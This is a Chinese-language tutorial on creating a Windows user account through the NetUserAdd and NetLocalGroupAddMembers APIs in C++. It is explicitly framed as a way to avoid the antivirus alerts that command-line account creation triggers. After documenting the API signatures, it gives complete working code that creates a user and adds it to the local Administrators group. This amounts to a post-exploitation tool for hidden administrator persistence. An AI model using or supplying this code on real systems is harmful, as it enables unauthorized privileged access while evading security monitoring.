利用NetUserAdd添加用户
---
我们已知在命令行添加用户会触发杀软的警报
所以我们利用C++调用win的api来进行用户添加
主要用到了win的NetUserAdd 和 NetLocalGroupAddMembers两个api函数，以及USER_INFO_1 结构体
NetUserAdd函数
```
NET_API_STATUS NET_API_FUNCTION NetUserAdd(
  LPCWSTR servername,  // LPCWSTR是一个指向unicode编码字符串的32 位指针，所指向字符串是wchar型
  DWORD   level, //DWORD 表示unsigned long ，长整型
  LPBYTE  buf, //LPBYTE 表示 unsigned char * 
  LPDWORD parm_err //LPDWORD为长指针
); 
/*
参数:
    servername 表示执行该功能的远程服务器DNS或NetBIOS名称，NULL表示本地计算机
    level 指定数据的信息级别，1表示USER_INFO_1,指定有关账户信息
    buf 指向指定缓冲区的指针，该数据格式主要依靠level的值 USER_INFO_1 表示一个用户信息的结构体
    parm_err 指向一个值的值，如果参数为NULL，表示不会在错误时返回索引
返回值:
    执行成功返回NERR_Success，失败返回对应失败的编号
*/
NetLocalGroupAddMembers函数
NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers(
  LPCWSTR servername,
  LPCWSTR groupname,
  DWORD   level,
  LPBYTE  buf,
  DWORD   totalentries
);
/*
参数:
    servername 表示执行该功能的远程服务器DNS或NetBIOS名称，NULL表示本地计算机
    groupname 添加到的用户组名
    level 表示指定数据的信息级别，3表示新的本地成员的域和名称
    buf 包含新本地成员数据的缓冲区指针
    totalentries 指定buf参数指向的缓冲区中的条目数
返回值:
    成功返回NERR_Success,失败返回错误代码
*/
USER_INFO_1 结构体
typedef struct _USER_INFO_1 {
  LPWSTR usri1_name; //添加用户名称
  LPWSTR usri1_password;  //密码
  DWORD  usri1_password_age; //NetUserAdd函数忽略该参数
  DWORD  usri1_priv; //分配给usri1_name成员的特权级别
  LPWSTR usri1_home_dir; //指向Unicode字符串的指针，该字符串为usri1_name成员中指定的用户指定主目录的路径。该字符串可以为NULL
  LPWSTR usri1_comment; //指向包含与用户帐户关联的注释的Unicode字符串的指针。该字符串可以是NULL字符串，也可以在终止的空字符之前包含任意数量的字符。
  DWORD  usri1_flags; //UF_SCRIPT 登录脚本已执行。必须设置该值。
  LPWSTR usri1_script_path; //指向Unicode字符串的指针，该字符串指定用户的登录脚本文件的路径。脚本文件可以是.CMD文件，.EXE文件或.BAT文件。该字符串也可以为NULL
} USER_INFO_1, *PUSER_INFO_1, *LPUSER_INFO_1;
```

完整代码如下：
```
#ifndef UNICODE
#define UNICODE
#endif
#include<Windows.h>
#include<iostream>
#include<lm.h>
#pragma comment(lib,"netapi32.lib") //必须
using namespace std;
int wmain(int argc, wchar_t *argv[]) {
    /*该函数用于添加账户*/
    USER_INFO_1 UserInfo;
    NET_API_STATUS Status; 
    NET_API_STATUS Status2;
    DWORD dwError = 0;
    //添加用户信息
    //cout << argv[0] << endl;
    UserInfo.usri1_name = argv[1];
    UserInfo.usri1_password = argv[2];
    UserInfo.usri1_priv = USER_PRIV_USER;
    UserInfo.usri1_home_dir = NULL;
    UserInfo.usri1_flags = UF_SCRIPT;
    UserInfo.usri1_script_path = NULL;
    UserInfo.usri1_comment = NULL;
    if (argc != 3) {
        cout << "Usage:  NetUserAdd.exe Username Password [+]"<< endl;
    }
    else {
        Status = NetUserAdd(NULL, 1, (LPBYTE)&UserInfo, &dwError);
        if (Status == NERR_Success) {
            cout << "User has been successfully added [+] " << endl;
            LOCALGROUP_MEMBERS_INFO_3 administrator;
            administrator.lgrmi3_domainandname = UserInfo.usri1_name;
            Status2 = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&administrator, 1);
            if (Status2 == NERR_Success) {
                cout << "User has been successfully in administrators [+]";
            }
            else {
                cout << "User has been filed added in administrators [-]";
            }
        }
        else {
            cout << "User has been filed added[-] " << endl;
            cout << "错误为[-]>> " << Status << endl;
        }
    
    }
}
```
